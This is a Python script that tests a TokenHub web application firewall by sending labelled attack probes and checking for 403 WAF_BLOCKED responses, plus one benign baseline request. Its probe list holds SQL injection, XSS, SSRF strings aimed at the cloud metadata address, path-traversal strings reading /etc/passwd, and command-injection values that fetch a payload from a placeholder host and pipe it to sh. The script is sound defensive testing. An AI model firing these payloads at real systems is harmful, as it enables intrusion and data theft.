#!/usr/bin/env python3
"""Exercise live TokenHub WAF detection with diverse, non-destructive probes.

Configure WAF detection in the admin console before running.  ``observe``
expects every attack request to continue without ``WAF_BLOCKED``; ``block``
expects every attack request to return ``403 WAF_BLOCKED``.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
from dataclasses import dataclass
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode
from urllib.request import Request, urlopen


@dataclass(frozen=True)
class Probe:
    category: str
    name: str
    target: str
    payload: str


PROBES = (
    Probe("sqli", "union_select", "query", "1 UNION SELECT 1"),
    Probe("sqli", "union_select_encoded", "query", "1%20UNION%20SELECT%201"),
    Probe("sqli", "select_from_json", "json_body", "select name from users"),
    Probe("xss", "script_tag", "query", "<script>alert(1)</script>"),
    Probe("xss", "xss_event_handler", "query", "<img src=x onerror=alert(1)>"),
    Probe("xss", "script_tag_json", "json_body", "<script>alert(1)</script>"),
    Probe("command_injection", "shell_separator", "query", "; curl http://example.invalid/payload | sh"),
    Probe("command_injection", "shell_chain_json", "json_body", "&& wget http://example.invalid/payload"),
    Probe("ssrf", "metadata_endpoint", "query", "http://169.254.169.254/latest/meta-data/"),
    Probe("ssrf", "loopback_json", "json_body", "http://127.0.0.1:2375/"),
    Probe("path_traversal", "double_encoded", "query", "%252e%252e%252fetc%252fpasswd"),
    Probe("path_traversal", "windows_separator", "query", "..\\..\\windows\\win.ini"),
    Probe("path_traversal", "encoded_request_path", "request_path", "..%2F..%2Fetc%2Fpasswd"),
)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Live HTTP probe for TokenHub WAF core attack detection")
    parser.add_argument("--base-url", default=os.getenv("BASE_URL", "http://localhost:8080"), help="TokenHub Caddy origin")
    parser.add_argument("--api-key", default=os.getenv("TOKENHUB_API_KEY", ""), help="Optional API key for API routes")
    parser.add_argument("--mode", choices=("observe", "block"), required=True, help="Active WAF detection mode")
    parser.add_argument("--timeout", type=float, default=10.0, help="Per-request timeout in seconds")
    return parser.parse_args()


def http_request(method: str, url: str, api_key: str, timeout: float, body: dict[str, str] | None = None) -> tuple[int, dict[str, Any]]:
    headers = {"Accept": "application/json"}
    data = None
    if api_key:
        headers["Authorization"] = f"Bearer {api_key}"
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode("utf-8")
    request = Request(url, data=data, headers=headers, method=method)
    try:
        with urlopen(request, timeout=timeout) as response:
            raw = response.read().decode("utf-8", errors="replace")
            return response.status, json.loads(raw) if raw else {}
    except HTTPError as error:
        raw = error.read().decode("utf-8", errors="replace")
        try:
            return error.code, json.loads(raw) if raw else {}
        except json.JSONDecodeError:
            return error.code, {"raw": raw}
    except URLError as error:
        raise RuntimeError(f"unable to reach {url}: {error.reason}") from error


def is_waf_blocked(status: int, body: dict[str, Any]) -> bool:
    return status == 403 and body.get("error", {}).get("code") == "WAF_BLOCKED"


def send_probe(base_url: str, api_key: str, timeout: float, probe: Probe) -> tuple[int, dict[str, Any]]:
    base_url = base_url.rstrip("/")
    if probe.target == "query":
        return http_request("GET", f"{base_url}/v1/models?{urlencode({'waf_probe': probe.payload})}", api_key, timeout)
    if probe.target == "json_body":
        return http_request("POST", f"{base_url}/v1/chat/completions", api_key, timeout, {"waf_probe": probe.payload})
    if probe.target == "request_path":
        return http_request("GET", f"{base_url}/v1/{probe.payload}", api_key, timeout)
    raise ValueError(f"unsupported probe target: {probe.target}")


def verify_probe(base_url: str, api_key: str, mode: str, timeout: float, probe: Probe) -> tuple[bool, str]:
    status, body = send_probe(base_url, api_key, timeout, probe)
    blocked = is_waf_blocked(status, body)
    expected = blocked if mode == "block" else not blocked
    requirement = "403 WAF_BLOCKED" if mode == "block" else "not WAF_BLOCKED"
    return expected, f"{probe.category}/{probe.name} [{probe.target}]: HTTP {status}, expected {requirement}"


def main() -> int:
    args = parse_args()
    failures: list[str] = []
    for probe in PROBES:
        ok, detail = verify_probe(args.base_url, args.api_key, args.mode, args.timeout, probe)
        print(("PASS" if ok else "FAIL") + " " + detail)
        if not ok:
            failures.append(detail)

    normal = Probe("normal", "baseline", "json_body", "Explain the SELECT keyword in one sentence.")
    status, body = send_probe(args.base_url, args.api_key, args.timeout, normal)
    normal_blocked = is_waf_blocked(status, body)
    print(("PASS" if not normal_blocked else "FAIL") + f" normal/baseline [json_body]: HTTP {status}, must not be WAF_BLOCKED")
    if normal_blocked:
        failures.append("normal request was blocked")

    if failures:
        print(f"{len(failures)} WAF probe(s) failed", file=sys.stderr)
        return 1
    print(f"{len(PROBES)} attack probes and one normal request verified in {args.mode} mode")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
